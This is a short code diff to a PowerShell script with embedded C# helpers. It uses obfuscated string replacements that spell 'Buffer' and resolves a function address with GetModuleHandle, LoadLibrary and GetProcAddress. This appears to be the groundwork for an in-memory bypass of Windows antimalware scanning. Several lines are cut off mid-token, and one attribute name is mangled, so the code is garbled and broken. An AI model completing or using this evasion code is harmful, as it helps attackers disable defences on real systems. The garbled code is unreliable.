@@ -25,7 +25,10 @@ public class NtHelpers {
     [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
     public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
 
-    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
+    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
+    public static extern IntPtr LoadLibrary(
+
+    [MethodImpl(MethodImplOptions.NoOptimizalining)]
     public static int Nop() {
         return 1;
     }
@@ -57,5 +60,6 @@ $s3 = $s3.replace('hello','Bu')
 $s3 = $s3.replace(', ','ff')
 $s3 = $s3.replace('world','er')
 
-$modBase = [NtHelpers]::GetModuleHandle($s1)
+[IntPtr] $modBase = [NtHelpers]::GetModuleHa
+if ($modBase -eq [IntPtr]::Zero) { $modBase = [NtHelpers]::LoadLibrary($s1) }
 [IntPtr] $funcAddr = [NtHelpers]::GetProcAdd
